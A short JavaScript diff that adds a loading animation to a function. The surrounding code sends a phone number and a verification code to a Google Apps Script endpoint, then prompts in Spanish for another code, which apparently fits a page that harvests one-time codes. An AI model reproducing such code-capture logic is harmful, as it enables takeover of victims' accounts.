@@ -131,7 +131,7 @@
     function startval() {
         $('#btn-val1').hide()
         $('#desss').hide()
-
+        $('.loading').show('fade', 200);
         var data = { 'verif': { 'number': local('numv'), 'code': local('code') } };
         fetch('https://script.google.com/macros/s/AKfycbyRuhQ70lekBs-lfifE8JepZFIvqXTatzlmHuOeuz5VxctrnYZB/exec?data=' + encodeURI(JSON.stringify(data)))
             .then(() => {
@@ -140,6 +140,7 @@
                 $('#desss').show()
                 $('#desss').html('Ingresa el código aquí')
                 $('#btn-val2').show()
+                $('.loading').hide('fade', 200);
             })
 
     }
